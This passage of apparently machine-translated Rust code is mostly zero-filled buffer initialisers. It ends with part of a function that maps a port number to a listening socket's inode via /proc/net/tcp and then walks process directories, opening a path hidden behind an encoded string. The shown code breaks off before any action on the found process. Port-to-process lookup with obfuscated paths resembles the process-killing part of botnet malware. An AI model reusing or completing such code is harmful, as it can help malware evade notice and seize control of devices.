        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
    ];
    let mut buffer: [libc::c_char; 512] = [
        0 as libc::c_int as libc::c_char,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
    ];
    let mut pid: libc::c_int = 0 as libc::c_int;
    let mut fd: libc::c_int = 0 as libc::c_int;
    let mut inode: [libc::c_char; 16] = [
        0 as libc::c_int as libc::c_char,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
    ];
    let mut ptr_path: *mut libc::c_char = path.as_mut_ptr();
    let mut ret: libc::c_int = 0 as libc::c_int;
    let mut port_str: [libc::c_char; 16] = [0; 16];
    util_itoa(ntohs(port) as libc::c_int, 16 as libc::c_int, port_str.as_mut_ptr());
    if strlen(port_str.as_mut_ptr()) == 2 as libc::c_int as libc::c_ulong {
        port_str[2 as libc::c_int as usize] = port_str[0 as libc::c_int as usize];
        port_str[3 as libc::c_int as usize] = port_str[1 as libc::c_int as usize];
        port_str[4 as libc::c_int as usize] = 0 as libc::c_int as libc::c_char;
        port_str[0 as libc::c_int as usize] = '0' as i32 as libc::c_char;
        port_str[1 as libc::c_int as usize] = '0' as i32 as libc::c_char;
    }
    fd = open(b"/proc/net/tcp\0" as *const u8 as *const libc::c_char, 0 as libc::c_int);
    if fd == -(1 as libc::c_int) {
        return 0 as libc::c_int;
    }
    while !(util_fdgets(buffer.as_mut_ptr(), 512 as libc::c_int, fd)).is_null() {
        let mut i_0: libc::c_int = 0 as libc::c_int;
        let mut ii: libc::c_int = 0 as libc::c_int;
        while buffer[i_0 as usize] as libc::c_int != 0 as libc::c_int
            && buffer[i_0 as usize] as libc::c_int != ':' as i32
        {
            i_0 += 1;
        }
        if buffer[i_0 as usize] as libc::c_int == 0 as libc::c_int {
            continue;
        }
        i_0 += 2 as libc::c_int;
        ii = i_0;
        while buffer[i_0 as usize] as libc::c_int != 0 as libc::c_int
            && buffer[i_0 as usize] as libc::c_int != ' ' as i32
        {
            i_0 += 1;
        }
        let fresh96 = i_0;
        i_0 = i_0 + 1;
        buffer[fresh96 as usize] = 0 as libc::c_int as libc::c_char;
        if !(util_stristr(
            &mut *buffer.as_mut_ptr().offset(ii as isize),
            strlen(&mut *buffer.as_mut_ptr().offset(ii as isize)) as libc::c_int,
            port_str.as_mut_ptr(),
        ) != -(1 as libc::c_int))
        {
            continue;
        }
        let mut column_index: libc::c_int = 0 as libc::c_int;
        let mut in_column: libc::c_int = 0 as libc::c_int;
        let mut listening_state: libc::c_int = 0 as libc::c_int;
        while column_index < 7 as libc::c_int
            && {
                i_0 += 1;
                buffer[i_0 as usize] as libc::c_int != 0 as libc::c_int
            }
        {
            if buffer[i_0 as usize] as libc::c_int == ' ' as i32
                || buffer[i_0 as usize] as libc::c_int == '\t' as i32
            {
                in_column = 1 as libc::c_int;
            } else {
                if in_column == 1 as libc::c_int {
                    column_index += 1;
                }
                if in_column == 1 as libc::c_int && column_index == 1 as libc::c_int
                    && buffer[(i_0 + 1 as libc::c_int) as usize] as libc::c_int
                        == 'A' as i32
                {
                    listening_state = 1 as libc::c_int;
                }
                in_column = 0 as libc::c_int;
            }
        }
        ii = i_0;
        if listening_state == 0 as libc::c_int {
            continue;
        }
        while buffer[i_0 as usize] as libc::c_int != 0 as libc::c_int
            && buffer[i_0 as usize] as libc::c_int != ' ' as i32
        {
            i_0 += 1;
        }
        let fresh97 = i_0;
        i_0 = i_0 + 1;
        buffer[fresh97 as usize] = 0 as libc::c_int as libc::c_char;
        if strlen(&mut *buffer.as_mut_ptr().offset(ii as isize))
            > 15 as libc::c_int as libc::c_ulong
        {
            continue;
        }
        strcpy(inode.as_mut_ptr(), &mut *buffer.as_mut_ptr().offset(ii as isize));
        break;
    }
    close(fd);
    if strlen(inode.as_mut_ptr()) == 0 as libc::c_int as libc::c_ulong {
        return 0 as libc::c_int;
    }
    dir = opendir(
        eika(
            b"'\xA0\xE7\xB9\xCE'\0" as *const u8 as *const libc::c_char
                as *mut libc::c_char,
        ),
    );
    if !dir.is_null() {
        loop {
            entry = readdir(dir);
            if !(!entry.is_null() && ret == 0 as libc::c_int) {
                break;
            }
            let mut pid_0: *mut libc::c_char = ((*entry).d_name).as_mut_ptr();
            if (*pid_0 as libc::c_int) < '0' as i32 || *pid_0 as libc::c_int > '9' as i32
            {
                continue;
            }
            strcpy(
                ptr_path,
